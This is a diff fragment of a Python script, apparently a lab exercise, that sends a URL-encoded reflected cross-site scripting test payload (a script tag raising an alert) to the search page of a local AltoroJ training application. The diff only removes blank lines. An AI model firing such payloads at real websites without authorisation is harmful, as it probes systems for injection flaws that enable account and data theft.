@@ -12,11 +12,8 @@ url = 'http://localhost:8080/AltoroJ/search.jsp'
 
 payload = "<script>alert('Hola, soy un script');</script>"
 
-
 encoded_payload = urllib.parse.quote(payload)
-
 full_url = f"{url}?query={encoded_payload}"
-
 response = requests.get(full_url)
 
 if response.status_code == 200:
